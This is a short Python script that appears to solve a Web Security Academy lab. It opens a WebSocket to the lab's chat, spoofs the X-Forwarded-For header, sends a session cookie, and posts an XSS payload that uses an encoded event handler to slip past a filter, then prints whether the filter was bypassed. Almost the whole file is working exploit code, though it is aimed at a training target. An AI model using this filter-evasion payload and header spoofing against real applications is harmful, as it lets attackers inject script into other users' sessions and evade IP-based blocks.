import asyncio
import websockets
import json

async def test():
    url = "wss://0af9006504a70472809003cb002b0085.web-security-academy.net/chat"
    headers = {
        'X-Forwarded-For': '127.0.0.100',
        'Cookie': 'session=DCLEtam3QSXcpbFtD0rqXUMHx8y2LtAg',
        'Origin': 'https://0af9006504a70472809003cb002b0085.web-security-academy.net',
    }
    
    # Test the key payload that should work
    payload = "<img src=x on%65rror=print(1)>"
    
    async with websockets.connect(url, extra_headers=headers) as ws:
        message = json.dumps({"message": payload})
        await ws.send(message)
        response = await ws.recv()
        print(f"Payload: {payload}")
        print(f"Response: {response}")
        
        if "error" not in response:
            print("[+] SUCCESS - Payload bypassed the filter!")
        else:
            print("[-] Blocked")

asyncio.run(test())
